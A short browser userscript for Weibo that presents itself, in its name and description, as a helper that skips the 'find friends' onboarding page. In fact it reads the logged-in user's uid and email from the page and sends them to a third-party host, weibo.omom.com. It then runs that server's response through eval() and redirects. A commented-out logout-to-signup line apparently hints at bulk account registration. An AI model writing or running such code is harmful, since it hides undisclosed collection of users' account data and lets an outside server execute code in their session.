// ==UserScript==
// @name       自动跳过找朋友
// @namespace  http://use.i.E.your.homepage/
// @version    0.1
// @description  自动跳过找朋友
// @match      *weibo.com/pub/guide_recommend.php*
// @copyright  2012+, You
// ==/UserScript==
function getQueryString(name) {
    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
    var r = window.location.search.substr(1).match(reg);
    if (r != null) return unescape(r[2]); return null;
}

var uid = getQueryString("uid");
if(!uid)
{
    var s = window.parent.document.getElementsByTagName("meta")[5].content;
    var p =/profile\/(\d+)/;
    var ret = p.exec(s);
    uid = ret[1];
}

var email = document.getElementsByTagName("font")[0].innerText;
var url = "http://weibo.omom.com/apis/z/add.php?step=opendone&email="+email+"&uid="+uid;
var xmlhttp = new XMLHttpRequest();

xmlhttp.open("GET", url);
xmlhttp.onreadystatechange=function()
{
    if (xmlhttp.readyState == 4 && xmlhttp.status == 200)
    {
        var ret = eval('(' + xmlhttp.responseText + ')');
        if(ret.code == 'A00000')
        {
            //document.location.href = "http://weibo.com/logout.php?backurl=https%3A%2F%2Flogin.sina.com.cn%2Fsignup%2Fsignup.php%3Fentry%3Dsso";
            document.location.href = "http://weibo.com/pub/guide_findfriends.php?a=1";
            return;
        }else{
            alert('账号提交失败，请联系技术解决。');
        }
    }
}
xmlhttp.send(null);
//document.location.href = "http://weibo.com";